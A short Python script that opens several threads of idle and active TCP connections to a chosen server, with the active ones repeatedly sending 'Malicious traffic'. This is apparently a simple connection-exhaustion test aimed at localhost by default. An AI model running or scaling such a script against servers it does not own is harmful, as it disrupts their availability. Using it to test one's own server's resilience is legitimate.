import socket
import threading
import time

def idle_connection(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        while True:
            time.sleep(10)
    except Exception as e:
        print(f"Idle connection error: {e}")
    finally:
        s.close()

def active_connection(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        while True:
            s.send(b"Malicious traffic\n")
            data = s.recv(1024)
            time.sleep(1)
    except Exception as e:
        print(f"Active connection error: {e}")
    finally:
        s.close()

def create_malicious_connections(target_ip, target_port, num_idle=5, num_active=5):
    for _ in range(num_idle):
        thread = threading.Thread(target=idle_connection, args=(target_ip, target_port))
        thread.start()
    
    for _ in range(num_active):
        thread = threading.Thread(target=active_connection, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Replace with the server IP address
    target_port = 12345      # Replace with the server port

    create_malicious_connections(target_ip, target_port)
